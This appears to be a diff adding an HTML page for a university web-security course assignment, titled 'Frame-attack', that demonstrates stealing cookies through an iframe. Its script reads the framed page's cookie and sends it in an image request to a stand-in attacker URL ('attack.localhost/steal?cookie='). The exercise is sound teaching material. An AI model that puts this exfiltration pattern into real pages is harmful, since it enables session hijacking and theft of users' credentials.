@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Frame-attack</title>
+</head>
+<body>
+	<h1>Assignment 4, CS 495/595 Web Security, Spring 2021</h1>
+	<br>
+    <h2>Let steal some cookies using iframes!</h2>
+
+	<hr>
+     <p>Below iframe cookie is safe</p>
+	<script>
+		const iframe = document.createElement('iframe')
+		iframe.src = 'http://localhost:5000/safe'
+		document.body.appendChild(iframe)
+
+		document.write(iframe.contentDocument.cookie)
+		console.log(iframe.contentDocument.cookie)
+
+		setTimeout(function() {
+	    const p = document.createElement('p')
+	    p.innerHTML = iframe.contentDocument.cookie
+	    document.body.appendChild(p)
+
+	    new Image().src = 'https://attack.localhost:5000/steal?cookie=' + iframe.contentDocument.cookie
+			}, 5000);
+	</script>
+</body>
+</html>
